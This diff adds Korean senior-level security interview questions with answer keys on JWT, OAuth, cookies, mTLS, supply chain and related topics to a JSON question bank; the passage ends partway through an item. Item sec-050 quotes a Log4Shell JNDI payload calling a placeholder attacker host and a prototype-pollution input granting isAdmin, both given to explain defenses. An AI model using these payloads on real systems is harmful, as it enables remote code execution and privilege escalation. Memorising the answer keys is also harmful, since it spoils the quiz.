@@ -838,5 +838,311 @@
       "Chain of Custody",
       "PCI-DSS"
     ]
+  },
+  {
+    "id": "sec-041",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "short-answer",
+    "question": "CVE 취약점 트리아지(Triage) 프로세스를 설명하고, npm audit 결과에서 실제로 수정해야 할 취약점과 그렇지 않아도 되는 취약점을 구분하는 기준을 설명하세요.",
+    "answer": "CVE Triage: CVSS 점수 + 실제 익스플로잇 가능성 + 환경 컨텍스트를 종합하여 우선순위를 결정한다. npm audit의 모든 취약점을 즉시 수정할 필요는 없다. 공격 경로(Attack Vector)가 현재 환경에서 실현 가능한지, 취약한 코드 경로가 실제로 사용되는지 확인해야 한다.",
+    "explanation": "취약점 평가 기준: 1) 공격 벡터(Network vs Local): 네트워크 원격 악용 가능한 취약점이 로컬 취약점보다 우선. 2) 익스플로잇 코드 공개 여부: PoC가 공개되면 위험도 급상승. 3) 실제 코드 경로: 취약한 함수가 실제로 호출되는가? 4) 환경: 서버 사이드 vs 브라우저 전용 취약점. devDependency의 취약점은 프로덕션 코드에 영향 없음.",
+    "seniorTip": "npm audit 실무 접근: 1) npm audit --production으로 devDependencies 제외. 2) CVSS 7.0 이상(High/Critical)을 우선 처리. 3) 취약한 패키지가 실제로 취약한 기능을 사용하는지 코드 검색. 4) 수정 불가능한 취약점(하위 패키지, 아직 패치 없음)은 npm audit --ignore-unfixed 또는 .nsprc로 리스크 수락 문서화. 5) Snyk, Dependabot을 CI에 통합하여 새 PR마다 자동 검사. 6) SBOM(Software Bill of Materials) 생성 — 파트너사나 감사 시 제공. 결제 서비스는 분기 1회 이상 npm audit 결과를 검토하고 보안팀에 보고하는 프로세스를 권장.",
+    "deepDive": "CVSS 점수가 동일해도 환경에 따라 실제 위험도가 달라지는 예시를 들면? → CVE가 공개된 후 패치 없는 Zero-Day 기간 동안 취약점을 완화(Mitigation)하는 방법은? → npm의 Audit Advisory는 어떤 데이터 소스를 기반으로 하며, GitHub Advisory Database와의 차이는?",
+    "tags": [
+      "CVE",
+      "취약점 관리",
+      "npm audit",
+      "CVSS",
+      "공급망 보안"
+    ]
+  },
+  {
+    "id": "sec-042",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "multiple-choice",
+    "question": "SBOM(Software Bill of Materials)이 공급망 보안에서 중요한 이유로 올바른 것은?",
+    "options": [
+      "A) SBOM은 성능 최적화를 위한 패키지 목록이다",
+      "B) SBOM은 소프트웨어에 포함된 모든 컴포넌트와 의존성을 문서화하여, 새로운 CVE 발생 시 영향받는 시스템을 즉시 파악하고 패치 우선순위를 결정할 수 있게 한다",
+      "C) SBOM은 라이선스 관리만을 위한 도구이다",
+      "D) SBOM은 클라우드 환경에서만 필요하다"
+    ],
+    "answer": "B) SBOM은 소프트웨어에 포함된 모든 컴포넌트와 의존성을 문서화하여, 새로운 CVE 발생 시 영향받는 시스템을 즉시 파악하고 패치 우선순위를 결정할 수 있게 한다",
+    "explanation": "Log4Shell(CVE-2021-44228) 사태에서 SBOM 없는 조직은 자사 시스템에 Log4j가 포함되어 있는지 파악하는 데 며칠이 걸렸다. SBOM이 있었다면 수분 내에 영향받는 서비스 목록을 뽑을 수 있었다. SBOM 형식: SPDX(Linux Foundation), CycloneDX(OWASP). 미국 정부는 EO 14028으로 SBOM 제공을 의무화.",
+    "seniorTip": "SBOM 생성 도구: 1) Syft — 컨테이너 이미지, 파일시스템에서 SBOM 생성. 2) cdxgen — CycloneDX 형식 SBOM. 3) npm ls --json으로 의존성 트리 추출 후 SBOM으로 변환. CI/CD 통합: 각 배포 시 Syft로 SBOM 생성 → S3에 버전별 저장. 새 CVE 발생 시 SBOM DB를 검색하여 영향받는 서비스를 수분 내 파악. 파트너사(금융, 대기업) 연동 시 SBOM 제공이 계약 조건이 되는 추세다.",
+    "deepDive": "Sigstore(cosign)를 사용한 컨테이너 이미지 서명과 SBOM 서명이 공급망 공격(이미지 위조)을 어떻게 방지하는가? → SBOM에서 라이선스 컴플라이언스 위반(GPL 코드가 사내 독점 소프트웨어에 포함)을 자동으로 탐지하는 방법은? → 179개 서비스를 운영하는 조직에서 SBOM을 실시간으로 관리하는 인프라 구축 방법은?",
+    "tags": [
+      "SBOM",
+      "공급망 보안",
+      "CVE",
+      "Sigstore",
+      "컴플라이언스"
+    ]
+  },
+  {
+    "id": "sec-043",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "short-answer",
+    "question": "JWT 취약점 중 'none 알고리즘 공격'과 'RS256-HS256 키 혼동 공격'의 원리와, NestJS에서 이를 방어하는 방법을 설명하세요.",
+    "answer": "none 알고리즘 공격: 헤더의 alg를 'none'으로 바꾸어 서명 없이 JWT를 위조. RS256-HS256 공격: 서버가 RS256 공개 키를 HS256의 비밀 키로 사용하도록 속여 서명 위조. NestJS JwtModule에서 알고리즘을 명시적으로 고정하고 알고리즘 목록을 제한하여 방어한다.",
+    "explanation": "none 공격: JWT 라이브러리가 alg=none을 허용하면, 공격자가 임의의 payload를 서명 없이 발급할 수 있다. RS256-HS256 공격: RS256 검증 시 공개 키(공개된 정보)를 가져와 HS256의 secret으로 사용. 서버가 HS256으로 검증하면 공격자가 직접 생성한 토큰이 통과한다. 방어: algorithms: ['RS256'] 옵션으로 수락할 알고리즘을 엄격하게 제한.",
+    "seniorTip": "NestJS JwtModule 설정: JwtModule.register({ secret: process.env.JWT_SECRET, signOptions: { expiresIn: '1h', algorithm: 'HS256' }, verifyOptions: { algorithms: ['HS256'] } }). RS256을 사용하는 경우: algorithms: ['RS256']으로 HS256을 명시적으로 배제. 추가 방어: 1) iss(issuer), aud(audience) 클레임 검증 — 다른 서비스의 JWT를 재사용하는 공격 방지. 2) 짧은 만료 시간(1시간) + Refresh Token Rotation. 3) JWT blacklist — 로그아웃 시 Redis에 만료 전 토큰을 블랙리스트에 추가. 4) jti(JWT ID) 클레임으로 개별 토큰 추적.",
+    "deepDive": "JWT 알고리즘을 RS256으로 변경할 때 키 로테이션을 구현하는 방법은? 공개 키 배포와 이전 키로 서명된 토큰 처리(kid 클레임 활용)는? → Refresh Token Rotation에서 토큰 재사용 감지(Refresh Token Reuse Detection)를 구현하는 방법과, 감지 시 해당 사용자의 모든 세션을 강제 종료하는 방법은? → OIDC의 id_token과 access_token의 차이, 그리고 NestJS에서 외부 OIDC Provider(Google, Kakao)를 통합하는 방법은?",
+    "tags": [
+      "JWT",
+      "알고리즘 공격",
+      "토큰 보안",
+      "인증",
+      "OIDC"
+    ]
+  },
+  {
+    "id": "sec-044",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "multiple-choice",
+    "question": "OAuth2의 Authorization Code Flow + PKCE에서 PKCE(Proof Key for Code Exchange)가 해결하는 공격은?",
+    "options": [
+      "A) CSRF 공격을 방지한다",
+      "B) Authorization Code를 가로챈 공격자가 액세스 토큰을 교환하지 못하도록 방지한다. 모바일 앱처럼 client_secret을 안전하게 보관할 수 없는 환경에서 필수이다",
+      "C) XSS 공격으로 인한 토큰 탈취를 방지한다",
+      "D) JWT 위조를 방지한다"
+    ],
+    "answer": "B) Authorization Code를 가로챈 공격자가 액세스 토큰을 교환하지 못하도록 방지한다. 모바일 앱처럼 client_secret을 안전하게 보관할 수 없는 환경에서 필수이다",
+    "explanation": "Authorization Code Flow: 1) 앱이 code_verifier(랜덤 문자열)와 code_challenge(SHA256 해시)를 생성. 2) code_challenge를 인증 서버에 전달. 3) 인증 서버가 Authorization Code 발급. 4) 앱이 code_verifier + Authorization Code로 토큰 교환. 공격자가 Authorization Code를 가로챠도 code_verifier 없이는 토큰 교환 불가.",
+    "seniorTip": "PKCE 구현(NestJS): Passport.js의 passport-oauth2 또는 openid-client가 PKCE를 자동으로 처리한다. 모바일/SPA 앱에서는 client_secret을 코드에 포함하면 공격자가 추출할 수 있으므로 PKCE가 필수. RFC 9700에서 Authorization Code Flow는 항상 PKCE를 사용하도록 권고. 실제 구현 시 state 파라미터(CSRF 방지)와 nonce(id_token 재사용 방지)를 함께 사용해야 한다. 파트너사가 OAuth2 서버를 구현할 때 PKCE 지원을 요구하면 보안 수준을 높일 수 있다.",
+    "deepDive": "OAuth2 Implicit Flow가 왜 deprecated되었는가? 브라우저 URL에 access_token이 노출되는 문제와 referrer 헤더 유출의 위험성은? → BFF(Backend for Frontend) 패턴으로 SPA의 OAuth2 토큰을 서버 사이드에서 관리하면 XSS 공격으로부터 어떻게 보호되는가? → SAML 2.0과 OIDC의 주요 차이점과, 엔터프라이즈 SSO 연동 시 어느 것을 선택해야 하는가?",
+    "tags": [
+      "OAuth2",
+      "PKCE",
+      "인증",
+      "모바일 보안",
+      "OIDC"
+    ]
+  },
+  {
+    "id": "sec-045",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "short-answer",
+    "question": "RBAC(Role-Based Access Control)와 ABAC(Attribute-Based Access Control)의 차이와, 결제 시스템에서 어느 것이 더 적합한지 근거를 제시하세요.",
+    "answer": "RBAC는 사용자 역할(admin, user, partner)에 따라 권한을 부여한다. 단순하지만 세밀한 제어가 어렵다. ABAC는 사용자, 리소스, 환경 속성 조합으로 권한을 결정한다. '자신의 주문만 조회', '근무 시간에만 접근' 같은 세밀한 정책이 가능하다.",
+    "explanation": "RBAC 예: admin 역할 = 모든 주문 조회. user 역할 = 자신의 주문 조회. 하지만 '특정 파트너의 주문은 해당 파트너 담당자만 조회'처럼 복잡한 조건에서는 역할이 폭발적으로 늘어난다. ABAC: 정책 = '주문의 ownerId == 요청자 ID' OR '요청자 역할 == admin' OR '요청자 파트너ID == 주문 파트너ID'. 속성 기반으로 정책 하나로 표현 가능.",
+    "seniorTip": "결제 시스템에서의 선택: 단순한 구조는 RBAC(NestJS Guard + @Roles()), 복잡한 리소스 소유권 규칙은 ABAC. NestJS 구현: 1) RBAC — JwtPayload의 role로 Guard에서 검증. 2) ABAC — OPA(Open Policy Agent) 또는 Casbin 라이브러리 통합. 정책을 외부 파일(Rego, .conf)로 관리하여 코드 변경 없이 정책 업데이트. AWS IAM의 정책 문서가 ABAC의 대표 예시다. ReBAC(Relationship-Based Access Control, Google Zanzibar 모델)은 '이 사용자가 이 리소스의 오너와 어떤 관계인가'로 권한을 결정 — Google Drive 같은 공유 모델에 적합.",
+    "deepDive": "Casbin을 NestJS에 통합하여 동적으로 정책을 로드하는 방법과, 정책 변경 시 캐시 무효화를 어떻게 처리하는가? → AWS STS의 AssumeRole과 ABAC 태그 기반 접근 제어를 조합하여 멀티테넌트 환경에서 테넌트 격리를 구현하는 방법은? → ReBAC에서 Google Zanzibar의 Tuple(user, relation, object)이 대규모 권한 그래프를 효율적으로 조회하는 방법은?",
+    "tags": [
+      "RBAC",
+      "ABAC",
+      "ReBAC",
+      "접근 제어",
+      "OPA"
+    ]
+  },
+  {
+    "id": "sec-046",
+    "category": "security",
+    "difficulty": "mid",
+    "type": "short-answer",
+    "question": "Secure Cookie의 속성(HttpOnly, Secure, SameSite)이 각각 어떤 공격을 방어하며, NestJS에서 올바르게 설정하는 방법을 설명하세요.",
+    "answer": "HttpOnly: XSS 공격으로 JavaScript가 쿠키를 탈취하는 것을 방지. Secure: HTTPS 연결에서만 쿠키를 전송하여 중간자 공격 방지. SameSite=Strict: CSRF 공격 방지(다른 사이트에서의 쿠키 전송 차단). NestJS에서 res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'strict' })로 설정.",
+    "explanation": "각 속성의 역할: 1) HttpOnly — document.cookie로 접근 불가. XSS 취약점이 있어도 세션 쿠키 탈취 불가. 2) Secure — HTTP 연결에서 쿠키가 평문으로 전송되는 것 방지. 3) SameSite=Strict — 다른 사이트에서 링크 클릭 시에도 쿠키 미전송. Lax는 top-level navigation에서만 허용. None은 모든 크로스 사이트 요청에 전송(CSRF 취약).",
+    "seniorTip": "실무 쿠키 설정: 1) 인증 쿠키: HttpOnly + Secure + SameSite=Strict + maxAge(짧은 세션) + Path=/. 2) CSRF 토큰은 HttpOnly 없이 저장(JS가 읽어야 하므로) + SameSite=Strict. 3) 서드파티 스크립트(Analytics, 광고)가 필요한 경우 SameSite=None;Secure 조합 — 반드시 HTTPS 필요. 4) __Secure- 접두사 쿠키는 HTTPS에서만 설정 가능한 추가 보호. 5) 결제 페이지의 세션 쿠키에 SameSite=Lax를 사용하면 공격자가 다른 사이트에서 GET 요청으로 세션을 악용할 수 있다 — Strict를 사용해야 한다.",
+    "deepDive": "SameSite=Strict가 로그인 후 외부 링크에서 사이트로 돌아올 때 세션이 초기화되는 UX 문제를 어떻게 해결하는가? → Cookie Prefixes(__Host-, __Secure-)가 SameSite와 Secure 속성 외에 추가로 제공하는 보안은? → 모바일 앱에서 쿠키 대신 로컬 스토리지에 토큰을 저장할 때의 보안 리스크와 SafeStorage 라이브러리가 제공하는 보호는?",
+    "tags": [
+      "Secure Cookie",
+      "HttpOnly",
+      "SameSite",
+      "CSRF",
+      "XSS"
+    ]
+  },
+  {
+    "id": "sec-047",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "multiple-choice",
+    "question": "mTLS(mutual TLS) 키 로테이션 시 무중단으로 진행하기 위해 반드시 필요한 단계는?",
+    "options": [
+      "A) 모든 서비스를 동시에 재시작하여 새 인증서를 적용한다",
+      "B) 신규 인증서를 기존 인증서와 병행 신뢰(Trust Bundle)에 추가하고, 모든 서비스가 신규 인증서를 신뢰한 후 기존 인증서를 제거하는 단계적 전환을 수행한다",
+      "C) mTLS는 키 로테이션이 필요 없다",
+      "D) 로드밸런서에서만 인증서를 변경하면 된다"
+    ],
+    "answer": "B) 신규 인증서를 기존 인증서와 병행 신뢰(Trust Bundle)에 추가하고, 모든 서비스가 신규 인증서를 신뢰한 후 기존 인증서를 제거하는 단계적 전환을 수행한다",
+    "explanation": "mTLS 키 로테이션 절차: 1) 신규 CA/인증서 생성. 2) 모든 서비스의 Trusted CA Bundle에 신규 CA를 추가(기존 CA 유지). 3) 서비스를 하나씩 신규 인증서로 교체. 4) 모든 서비스가 신규 인증서를 사용한 후 기존 CA 제거. 5) 기존 인증서를 신뢰하는 서비스가 없으면 기존 CA 삭제. 이 단계를 건너뛰면 구 인증서를 가진 서비스가 신 CA를 신뢰하지 않아 통신이 중단된다.",
+    "seniorTip": "Istio/Cert-Manager를 사용하는 환경: cert-manager가 인증서 만료 전 자동 갱신을 처리하지만, Root CA 로테이션은 별도 절차가 필요하다. cert-manager의 CA Injector + Trust Manager를 사용하면 Trust Bundle 배포를 자동화할 수 있다. 실무 주의사항: 1) 인증서 만료 30일 전에 알림 설정(Prometheus AlertManager 또는 Datadog). 2) cert-manager의 CertificateRequest 상태를 모니터링. 3) 기업 내부 PKI(Private CA)와 공개 CA의 인증서 체인 차이를 이해해야 한다.",
+    "deepDive": "Istio의 PeerAuthentication 정책에서 PERMISSIVE 모드에서 STRICT 모드로 전환하는 단계적 방법과, 전환 중 mTLS를 지원하지 않는 레거시 서비스를 어떻게 처리하는가? → Certificate Transparency Log가 인증서 오발급(CA 침해)을 조기에 감지하는 원리는? → Kubernetes에서 cert-manager의 ClusterIssuer와 Issuer의 차이와 멀티 네임스페이스 환경에서의 선택 기준은?",
+    "tags": [
+      "mTLS",
+      "키 로테이션",
+      "PKI",
+      "cert-manager",
+      "Istio"
+    ]
+  },
+  {
+    "id": "sec-048",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "short-answer",
+    "question": "HSTS(HTTP Strict Transport Security) preload와 Certificate Pinning의 개념, 위험성, 그리고 모바일 API 통신에서의 사용 기준을 설명하세요.",
+    "answer": "HSTS: 브라우저에게 해당 도메인은 항상 HTTPS로만 접속하도록 강제. Preload List 등록 시 브라우저가 하드코딩하여 최초 접속도 HTTPS. Certificate Pinning: 클라이언트가 서버 인증서를 하드코딩하여 MITM 공격 방지. 단, 핀 교체 실패 시 서비스 중단 위험이 있다.",
+    "explanation": "HSTS max-age=31536000; includeSubDomains; preload로 설정. Preload 위험성: 한번 등록하면 제거에 수개월 걸림. HTTPS가 없는 서브도메인이 있으면 전체가 차단됨. Certificate Pinning: 앱에 특정 인증서 또는 공개 키를 하드코딩. 인증서 갱신/CA 변경 시 앱 업데이트 없이는 통신 불가 — 프로덕션 장애 위험.",
+    "seniorTip": "권장 전략: 1) HSTS — 모든 HTTPS 서비스에 적용. Preload는 완전히 HTTPS 전환을 확인한 후 신중하게. 2) Certificate Pinning — 고위험 금융/뱅킹 앱에서만 고려. 공개 키 핀닝(HPKP)은 deprecated되었으므로 앱 레벨에서 구현. 3) Public Key Pinning을 사용할 때는 반드시 백업 핀(Backup Pin)을 함께 등록하여 주 인증서 갱신 시에도 백업 핀으로 연결 유지. 4) OkHttp(Android), TrustKit(iOS)으로 구현. 5) 대안: Certificate Transparency + OCSP Stapling으로 인증서 위조를 감지.",
+    "deepDive": "Certificate Pinning이 깨지는 시나리오(CA 침해, 인증서 갱신 실수)에서 모바일 앱의 긴급 업데이트 없이 서비스를 복구하는 방법은? → Android의 Network Security Configuration과 iOS의 ATS(App Transport Security) 설정이 Certificate Pinning 구현에서 어떻게 활용되는가? → OCSP Stapling과 OCSP Must-Staple 확장이 인증서 폐기(Revocation) 확인을 더 효율적으로 만드는 방법은?",
+    "tags": [
+      "HSTS",
+      "Certificate Pinning",
+      "HTTPS",
+      "모바일 보안",
+      "PKI"
+    ]
+  },
+  {
+    "id": "sec-049",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "multiple-choice",
+    "question": "Privacy by Design(PbD)의 핵심 원칙 중 '데이터 최소화(Data Minimization)'와 '목적 제한(Purpose Limitation)'이 실무 시스템 설계에 미치는 영향으로 올바른 것은?",
+    "options": [
+      "A) 데이터를 많이 수집할수록 서비스가 좋아지므로 모든 데이터를 수집한다",
+      "B) 서비스 목적에 필요한 최소한의 데이터만 수집하고, 수집 목적 외의 용도로 데이터를 사용하지 않는다. API 응답에서도 불필요한 필드는 제거한다",
+      "C) PbD는 GDPR이 적용되는 유럽 서비스에만 해당된다",
+      "D) 데이터 최소화는 데이터베이스 저장 비용 절감을 위한 원칙이다"
+    ],
+    "answer": "B) 서비스 목적에 필요한 최소한의 데이터만 수집하고, 수집 목적 외의 용도로 데이터를 사용하는 않는다. API 응답에서도 불필요한 필드는 제거한다",
+    "explanation": "Privacy by Design 7원칙: 1) 사후 조치가 아닌 사전 예방. 2) 기본값으로 프라이버시 보호. 3) 설계에 프라이버시 내장. 4) 제로섬이 아닌 전기능 보호. 5) 엔드투엔드 보안. 6) 가시성과 투명성. 7) 사용자 프라이버시 존중. 데이터 최소화: 전화번호를 수집할 필요가 없으면 수집하지 않음. API 응답에 비밀번호 해시, 내부 ID 등을 포함시키지 않음.",
+    "seniorTip": "실무 적용: 1) 회원가입 시 이메일+비밀번호만 필수, 나머지는 선택. 2) 로그에 개인정보(주민번호, 카드번호) 마스킹 자동화. 3) 내부 API 응답에도 민감 데이터 제거(@ApiHideProperty, @Exclude()). 4) DB 컬럼 암호화 — 카드번호, 계좌번호는 AES-256으로 암호화하여 저장. 5) 데이터 보존 기간 정책 — 결제 데이터는 5년(세법), 로그는 1년, 임시 데이터는 30일. 자동 삭제 스케줄러 구현. 6) 개인정보 처리 방침에 명시된 목적 외 데이터 활용 시 추가 동의 필수.",
+    "deepDive": "국내 개인정보보호법(PIPA)과 GDPR의 핵심 차이점과, 한국에서 서비스하는 기업이 둘 다 준수해야 하는 경우는? → PII(Personally Identifiable Information)와 PHI(Protected Health Information)의 차이와, 헬스케어 관련 서비스에서의 추가 보호 요구사항은? → 데이터 삭제 요청(Right to be Forgotten)을 마이크로서비스 환경에서 구현할 때, 여러 서비스에 분산된 데이터를 어떻게 추적하고 삭제하는가?",
+    "tags": [
+      "Privacy by Design",
+      "데이터 최소화",
+      "GDPR",
+      "개인정보보호",
+      "PIPA"
+    ]
+  },
+  {
+    "id": "sec-050",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "short-answer",
+    "question": "log4shell(CVE-2021-44228)과 같은 공격 원리인 JNDI Injection이 Node.js/NestJS 환경에서 동일하게 발생하지 않는 이유와, 유사한 위협(Template Injection, Prototype Pollution)을 설명하세요.",
+    "answer": "JNDI Injection은 Java의 JNDI 로케이터가 원격 코드를 동적으로 로드하는 Java 특유의 기능을 악용한다. Node.js에는 JNDI가 없으므로 동일 공격이 불가능하다. 유사 위협: Template Injection(Handlebars, Pug에서 서버사이드 코드 실행)과 Prototype Pollution(객체 프로토타입 오염으로 권한 우회)이 Node.js의 주요 위협이다.",
+    "explanation": "JNDI Injection: 사용자 입력이 log4j의 로그 메시지로 들어가면 ${jndi:ldap://attacker.com/exploit}이 원격 클래스 로딩을 유발. Node.js에는 이런 JVM 기능이 없다. Prototype Pollution: merge(obj, JSON.parse(userInput))에서 userInput이 {'__proto__': {'isAdmin': true}}이면 모든 객체에 isAdmin 속성이 추가된다.",
+    "seniorTip": "Node.js/NestJS 실제 위협과 방어: 1) Prototype Pollution — lodash merge 대신 JSON.parse/stringify, Object.assign 대신 structuredClone 사용. 2) Template Injection — 사용자 입력을 Handlebars 템플릿에 직접 삽입 금지. 검증 없이 {{userInput}}은 서버사이드 코드 실행. 3) 역직렬화 공격 — node-serialize, eval() 사용 금지. 4) Path Traversal — 파일 경로에 사용자 입력 포함 시 path.normalize() + 화이트리스트 검증. 5) ReDoS(Regular Expression DoS) — 복잡한 정규식에 긴 입력으로 CPU 100% 유발. safe-regex 라이브러리로 위험 정규식 탐지.",
+    "deepDive": "Prototype Pollution이 NestJS 애플리케이션에서 권한 우회로 이어지는 구체적인 시나리오는? → node:vm 모듈의 Sandbox Escape 취약점이 발생하는 원인과, 안전한 코드 실행 격리를 위한 대안(isolated-vm, Worker Threads)은? → 역직렬화 공격(Deserialization Attack)이 Java와 Node.js에서 각각 다르게 나타나는 이유와, Node.js에서의 방어 방법은?",
+    "tags": [
+      "log4shell",
+      "Prototype Pollution",
+      "Template Injection",
+      "Node.js 보안",
+      "ReDoS"
+    ]
+  },
+  {
+    "id": "sec-051",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "short-answer",
+    "question": "BGP Hijacking과 RPKI(Resource Public Key Infrastructure)를 보안 관점에서 설명하고, AWS 환경에서 서비스 운영자가 BGP 하이재킹의 영향을 받는 시나리오와 완화 방법을 설명하세요.",
+    "answer": "BGP Hijacking은 공격자가 BGP 라우팅 정보를 위조하여 다른 조직의 IP 블록을 자신이 광고함으로써 트래픽을 가로채는 공격이다. RPKI는 IP 블록 소유자가 디지털 서명으로 BGP Route Origin을 인증하여 위조 광고를 차단한다.",
+    "explanation": "BGP Hijacking: 2018년 Amazon Route53 트래픽이 악의적 AS로 하이재킹되어 이더리움 지갑 주소를 DNS 응답에 위조한 사건. 2008년 Pakistan Telecom이 YouTube를 하이재킹한 사건. RPKI: Route Origin Authorization(ROA)으로 '이 IP 블록은 이 AS만 광고할 수 있다'를 서명으로 증명. ISP와 클라우드가 RPKI-invalid 경로를 필터링하면 Hijacking이 성공하지 못한다.",
+    "seniorTip": "AWS 사용자 관점: 1) AWS는 자체 RPKI를 운영하여 AWS IP 블록을 보호하지만, DNS 레이어는 여전히 취약점이 있다. 2) DNSSEC 적용 — Route53에서 DNSSEC를 활성화하면 DNS 응답 위조 방지. 3) 인증서 Transparency 모니터링 — Certificate Transparency Log를 모니터링하여 오발급 인증서를 빠르게 감지. 4) BGP 모니터링 서비스(CAIDA BGPstream, bgpmon.net)로 자사 IP 블록이 하이재킹되면 알림 수신. 5) Anycast(Cloudflare, AWS Global Accelerator)를 사용하면 BGP Hijacking의 영향을 분산시킬 수 있다.",
+    "deepDive": "RPKI ROA 서명과 BGP Route Origin Validation이 실제로 하이재킹을 차단하는 메커니즘을 AS(Autonomous System) 관점에서 설명하면? → AWS Route53의 DNSSEC와 BGP 수준의 보호가 각각 어떤 공격 벡터를 방어하는가? → Anycast 네트워크가 BGP Hijacking의 영향을 어떻게 제한하고, Cloudflare Workers와 Lambda@Edge가 Anycast 위에서 동작하는 방식은?",
+    "tags": [
+      "BGP Hijacking",
+      "RPKI",
+      "DNSSEC",
+      "Anycast",
+      "네트워크 보안"
+    ]
+  },
+  {
+    "id": "sec-052",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "multiple-choice",
+    "question": "AWS STS AssumeRole 체인에서 발생할 수 있는 Confused Deputy 문제와 방어 방법은?",
+    "options": [
+      "A) AssumeRole 체인은 항상 안전하므로 추가 방어가 필요 없다",
+      "B) 신뢰받는 서비스(Deputy)가 권한 있는 역할을 수임할 때 악의적 요청자가 Deputy를 이용해 권한 상승하는 문제. aws:SourceAccount, aws:SourceArn 조건 키로 방어한다",
+      "C) AssumeRole은 Cross-Account에서만 사용 가능하다",
+      "D) Confused Deputy는 K8s 환경에서만 발생한다"
+    ],
+    "answer": "B) 신뢰받는 서비스(Deputy)가 권한 있는 역할을 수임할 때 악의적 요청자가 Deputy를 이용해 권한 상승하는 문제. aws:SourceAccount, aws:SourceArn 조건 키로 방어한다",
+    "explanation": "Confused Deputy: 서비스 A(Deputy)가 역할 B를 수임할 수 있는 권한이 있을 때, 악의적 사용자가 서비스 A를 통해 역할 B의 권한으로 자신의 리소스를 접근하게 만드는 공격. 예: Cross-Account S3 접근에서 공격자가 자신의 S3 버킷을 Deputy 서비스의 ARN으로 위장. 방어: aws:SourceAccount 조건으로 요청 원본 계정을 검증.",
+    "seniorTip": "AWS 실무 방어: 1) S3 버킷 정책에서 aws:SourceArn: !Sub 'arn:aws:iam::${AWS::AccountId}:root' 조건 추가. 2) Lambda 신뢰 정책에 aws:SourceAccount 조건 추가. 3) EKS IRSA(IAM Roles for Service Accounts)에서 OIDC 토큰의 sub 클레임으로 특정 서비스 어카운트만 역할 수임 허용. 4) SCP(Service Control Policy)로 조직 레벨에서 AssumeRole 체인의 최대 깊이를 제한. 5) CloudTrail에서 AssumeRole 이벤트를 모니터링하여 비정상적인 역할 수임 패턴 탐지.",
+    "deepDive": "EKS에서 IRSA(IAM Roles for Service Accounts)가 Confused Deputy 문제를 방지하는 방식과, Pod Identity Webhook이 OIDC 토큰을 주입하는 메커니즘은? → AWS Organizations SCP로 특정 AssumeRole 패턴(외부 계정으로의 역할 위임)을 차단하는 정책을 어떻게 작성하는가? → Multi-Account 환경에서 OU(Organizational Unit) 구조와 SCP 계층이 권한 상승 공격을 어떻게 제한하는가?",
+    "tags": [
+      "AWS STS",
+      "AssumeRole",
+      "Confused Deputy",
+      "IRSA",
+      "IAM"
+    ]
+  },
+  {
+    "id": "sec-053",
+    "category": "security",
+    "difficulty": "mid",
+    "type": "short-answer",
+    "question": "Refresh Token Rotation 전략과 Token Reuse Detection 구현 방법을 설명하고, 토큰 탈취 시나리오에서 어떻게 대응하는지 설명하세요.",
+    "answer": "Refresh Token Rotation: 새 Access Token 발급 시 Refresh Token도 함께 교체하여 단일 사용으로 만든다. Token Reuse Detection: 이미 사용된 Refresh Token이 재사용되면 해당 사용자의 모든 세션을 강제 종료하여 탈취를 감지한다.",
+    "explanation": "구현: 1) Refresh Token 발급 시 DB에 jti(JWT ID)와 parent_jti를 저장. 2) Refresh Token 사용 시 jti를 revoked로 표시하고 새 Refresh Token 발급. 3) 이미 revoked된 jti로 재요청이 오면 → 탈취 감지 → 해당 사용자의 refresh_tokens 테이블에서 모든 토큰 무효화(로그아웃). 4) 정상 사용자에게 재로그인 요청.",
+    "seniorTip": "구현 시 고려사항: 1) Refresh Token을 HttpOnly 쿠키에 저장하면 XSS로 탈취 불가. 2) Refresh Token 저장소: Redis(빠른 조회, TTL 관리) 또는 DB(영구적, 분석 가능). 3) 모바일 앱의 토큰 저장: iOS Keychain, Android Keystore 사용. 4) Sliding Session: Refresh Token 사용 시 만료를 연장하면 활성 사용자는 계속 로그인 유지. 5) 탈취 감지 시 사용자에게 이메일 알림 발송('새 기기에서 로그인 시도가 감지되었습니다'). 결제 서비스에서는 탈취 감지 후 진행 중인 결제를 중단하고 재인증을 요구하는 추가 보안 레이어가 필요하다.",
+    "deepDive": "토큰 탈취 후 공격자가 먼저 토큰을 사용하여 새 토큰을 발급받으면, 정상 사용자의 요청이 Reuse Detection을 트리거한다 — 이 경우 오탐(False Positive)을 최소화하면서도 보안을 유지하는 방법은? → Redis 기반 Refresh Token 저장소에서 데이터가 유실되면 모든 사용자가 로그아웃되는 문제를 어떻게 완화하는가? → 동시에 여러 기기에서 로그인을 허용하면서 토큰 로테이션을 적용할 때 발생하는 race condition을 어떻게 해결하는가?",
+    "tags": [
+      "Refresh Token",
+      "Token Rotation",
+      "인증",
+      "세션 보안",
+      "JWT"
+    ]
+  },
+  {
+    "id": "sec-054",
+    "category": "security",
+    "difficulty": "senior",
+    "type": "multiple-choice",
+    "question": "npm 패키지의 postinstall 스크립트를 통한 공급망 공격을 방지하기 위한 가장 효과적인 방법은?",
+    "options": [
+      "A) 모든 npm 패키지를 수동으로 검토한다",
+      "B) npm install --ignore-scripts 옵션을 사용하고, 필요한 경우에만 개별적으로 스크립트를 허용한다. CI 환경에서 sandbox를 통해 빌드하고 네트워크 아웃바운드를 차단한다",
+      "C) npm audit를 실행하면 postinstall 스크립트 공격을 감지할 수 있다",
+      "D) package-lock.json을 사용하면 완전히 방지된다"
+    ],
+    "answer": "B) npm install --ignore-scripts 옵션을 사용하고, 필요한 경우에만 개별적으로 스크립트를 허용한다. CI 환경에서 sandbox를 통해 빌드하고 네트워크 아웃바운드를 차단한다",
+    "explanation": "postinstall 공격: 악성 npm 패키지가 설치 시 postinstall 스크립트로 환경 변수, AWS 자격증명, SSH 키를 외부로 전송한다. 2022년 node-ipc 사건: 우크라이나 전쟁 중 특정 IP에서 파일을 삭제하는 코드가 postinstall에 포함됨. npm install --ignore-scripts로 모든 스크립트 비활성화. 빌드에 필수적인 스크립트(node-sass, bcrypt)는 개별 허용.",
